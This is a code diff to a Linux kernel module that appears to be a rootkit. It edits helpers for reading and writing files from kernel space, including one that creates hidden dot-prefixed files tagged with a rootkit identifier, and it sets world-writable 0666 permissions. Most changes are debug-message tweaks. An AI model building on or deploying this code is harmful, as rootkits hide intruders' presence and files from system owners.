@@ -13,19 +13,18 @@ struct kern_file{ //file holding data for file reading/writing
     ssize_t ret;
 };
 
-static struct kern_file *open_file(char *path, int flags){ //opens file from path
-	printk(KERN_DEBUG "in open_file- path = %s\n", path);
+static struct kern_file *open_file(char *path, int flags){ //opens file from pat3h
+	printk(KERN_DEBUG "[open_file] path = %s\n", path);
 	//code from https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
-	struct kern_file *file; //file descriptor
+	struct kern_file *file=kzalloc(sizeof(struct kern_file), GFP_KERNEL); //file descriptor
     int err = 0; //error code
 
-	printk("opening file...\n");
-    file->fd = filp_open(path, flags, 0644); //opens the file in append mode
-	printk("opened file...\n");
+	printk("[open_file] opening file...\n");
+    file->fd = filp_open(path, flags, 0666); //opens the file in append mode
     if (IS_ERR(file->fd)) { //if file doesnt exist
-		printk(KERN_DEBUG "error opening file\n");
+		printk(KERN_DEBUG "[open_file] error opening file\n");
 		err = PTR_ERR(file->fd); //get error code
-		printk(KERN_DEBUG "error = %i\n", err);
+		printk(KERN_DEBUG "[open_file] error = %i\n", err);
 		return (struct kern_file*) NULL; //return NULL
     }
     return file; //return file
@@ -50,26 +49,27 @@ static int file_write(struct kern_file *file, void *buf){ //writes data to file
 	printk(KERN_DEBUG "in file write\n");
 	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
 	file->pos = 0;
+	printk(KERN_DEBUG "writing %s\n", (char *) buf);
 	kernel_write(file->fd, buf, file->count, &(file->pos));
 	return 0;
 }
 
 
 static struct kern_file *open_hidden_file(char *filename){ //opens file in /bin prepended with ROOTKIT_ID or creates if doesn't exist
-	printk(KERN_DEBUG "in open_hidden_file- file = %s\n", filename);
+	printk(KERN_DEBUG "[open_hidden_file] in open_hidden_file- file = %s\n", filename);
 	struct kern_file *hidden_file;
 
 	char *path; //char array to hold name of directory
 	path = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
 	sprintf(path, "/.%s%s", ROOTKIT_ID, filename); //formats name of directory to be made
-	printk(KERN_DEBUG "path = %s\n", path);
+	printk(KERN_DEBUG "[open_hidden_file] path = %s\n", path);
 	hidden_file = open_file(path, O_APPEND | O_RDWR);
 	if (hidden_file==NULL){ //file doesn't exist
-		printk(KERN_DEBUG "error creating file\n");
+		printk(KERN_DEBUG "[open_hidden_file] error opening file\n");
 		hidden_file = open_file(path, O_CREAT | O_RDWR);
 	}
 	if (hidden_file==NULL){ //file doesn't exist
-		printk(KERN_DEBUG "error creating file\n");
+		printk(KERN_DEBUG "[open_hidden_file] error creating file\n");
 	}
     return hidden_file; //return file
 }
